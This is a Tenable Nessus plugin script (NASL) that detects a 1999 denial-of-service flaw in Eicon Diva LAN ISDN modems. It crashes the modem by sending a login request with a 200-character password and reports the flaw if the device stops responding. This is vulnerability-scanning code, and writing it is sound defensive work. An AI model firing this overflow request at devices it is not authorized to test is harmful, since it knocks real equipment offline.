#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10062);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-1533");
 script_bugtraq_id(665);
 script_xref(name:"OSVDB", value:"13556");

 script_name(english:"Eicon Technology Diva LAN ISDN Modem login.htm Long password Field DoS");
 script_summary(english:"overflows a remote buffer");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote modem has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host appears to be an Eicon Technology Diva LAN ISDN modem.\n",
     "\n",
     "Nessus crashed the modem by supplying a long password to the login\n",
     "page.  This is likely due to a buffer overflow.  A remote attacker\n",
     "could exploit this by repeatedly disabling the modem."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://marc.info/?l=bugtraq&m=93846522511387&w=2"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this modem's firmware."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"Denial of Service");

 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");
 script_dependencies("http_version.nasl", "no404.nasl");

 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

if (http_is_dead(port:port)) exit(0);
r = http_send_recv3(port:port, method:"GET", item: string("/login.htm?password=", crap(200)));
if (http_is_dead(port:port, retry: 2)) security_hole(port);


